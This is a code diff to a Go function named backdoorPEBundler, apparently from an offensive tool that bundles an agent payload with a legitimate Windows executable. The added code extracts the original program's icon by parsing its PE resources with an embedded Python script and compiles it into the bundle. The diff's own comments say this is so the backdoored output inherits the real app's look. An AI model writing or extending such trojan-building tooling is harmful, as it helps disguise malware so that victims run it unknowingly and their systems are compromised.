@@ -90,6 +90,10 @@ func backdoorPEBundler(origPath, agentPath, outputPath string, obfuscate bool) (
 		return "", fmt.Errorf("copy agent: %w", err)
 	}
 
+	// Extract icon from original PE and compile a .syso resource file
+	// so the bundler inherits the original app's icon.
+	embedIcon(origPath, tmpDir)
+
 	// Write the bundler Go source
 	src := `package main
 
@@ -178,6 +182,126 @@ func main() {
 	}
 
 	return absOutput, nil
+}
+
+// embedIcon extracts the icon from the original PE and compiles a .syso
+// resource file so the bundler inherits the app's icon.
+// Silently skips on any error — icon is best-effort.
+func embedIcon(pePath, tmpDir string) {
+	// Use Python to extract the icon (cleaner PE parsing)
+	pyScript := `
+import sys, struct, os
+
+def read32(d,o): return struct.unpack_from('<I',d,o)[0]
+def read16(d,o): return struct.unpack_from('<H',d,o)[0]
+
+pePath = sys.argv[1]
+outPath = sys.argv[2]
+
+data = open(pePath,'rb').read()
+if data[:2] != b'MZ': sys.exit(1)
+
+pe_off = read32(data, 0x3c)
+is64 = read16(data, pe_off+24) == 0x020B
+num_sec = read16(data, pe_off+6)
+opt_sz = read16(data, pe_off+20)
+sec_base = pe_off + 24 + opt_sz
+
+# Resource data directory (index 2)
+dd_off = pe_off + 24 + (112 if is64 else 96) + 16
+rsc_rva = read32(data, dd_off)
+if rsc_rva == 0: sys.exit(1)
+
+# Find .rsrc section
+rbase = raw = va = 0
+for i in range(num_sec):
+    off = sec_base + i*40
+    sec_va  = read32(data, off+12)
+    sec_vsz = read32(data, off+16)
+    sec_raw = read32(data, off+20)
+    if sec_va <= rsc_rva < sec_va + sec_vsz:
+        raw = sec_raw; va = sec_va
+        rbase = sec_raw + (rsc_rva - sec_va)
+        break
+if rbase == 0: sys.exit(1)
+
+rva2off = lambda rva: raw + (rva - va)
+
+def read_dir(off):
+    return read16(data, off+12), read16(data, off+14)  # named, id counts
+
+def dir_entries(off):
+    named, ids = read_dir(off)
+    return [(read32(data, off+16+i*8), read32(data, off+16+i*8+4)) for i in range(named+ids)]
+
+# RT_ICON = 3, collect all icon raw data by ID
+icons = {}
+for tid, tsub in dir_entries(rbase):
+    if tid != 3: continue  # RT_ICON only
+    tsub &= 0x7FFFFFFF
+    for iid, isub in dir_entries(rbase + tsub):
+        isub &= 0x7FFFFFFF
+        # Take first language entry
+        for lid, lsub in dir_entries(rbase + isub):
+            if lsub & 0x80000000: continue  # skip subdirs
+            doff = rbase + lsub
+            drva = read32(data, doff)
+            dsz  = read32(data, doff+4)
+            icons[iid] = data[rva2off(drva):rva2off(drva)+dsz]
+            break
+
+if not icons: sys.exit(1)
+
+# Find the best (largest) icon
+best = max(icons.values(), key=len)
+
+# Parse DIB to get width/height
+if len(best) < 40: sys.exit(1)
+w = read32(best, 4); h = read32(best, 8); bpp = read16(best, 14)
+w8 = 0 if w >= 256 else w
+h8 = 0 if h//2 >= 256 else h//2
+
+# Write .ico
+with open(outPath,'wb') as f:
+    # ICONDIR
+    f.write(struct.pack('<HHH', 0, 1, 1))
+    # ICONDIRENTRY
+    f.write(struct.pack('<BBBBHHII', w8, h8, 0, 0, 1, bpp, len(best), 22))
+    f.write(best)
+`
+	icoPath := filepath.Join(tmpDir, "app.ico")
+	pyPath := filepath.Join(tmpDir, "extract_icon.py")
+	if err := os.WriteFile(pyPath, []byte(pyScript), 0644); err != nil {
+		return
+	}
+
+	py, err := exec.LookPath("python3")
+	if err != nil {
+		return
+	}
+	cmd := exec.Command(py, pyPath, pePath, icoPath)
+	if err := cmd.Run(); err != nil {
+		return
+	}
+	if _, err := os.Stat(icoPath); err != nil {
+		return
+	}
+
+	// Write resource script
+	rcPath := filepath.Join(tmpDir, "resource.rc")
+	if err := os.WriteFile(rcPath, []byte("1 ICON \"app.ico\"\n"), 0644); err != nil {
+		return
+	}
+
+	// Compile with windres → resource.syso (Go auto-links *.syso in build dir)
+	windres, err := exec.LookPath("x86_64-w64-mingw32-windres")
+	if err != nil {
+		return
+	}
+	sysoPath := filepath.Join(tmpDir, "resource.syso")
+	rc := exec.Command(windres, "-i", rcPath, "-o", sysoPath, "--target=pe-x86-64")
+	rc.Dir = tmpDir
+	rc.CombinedOutput()
 }
 
 // copyFile copies src to dst.
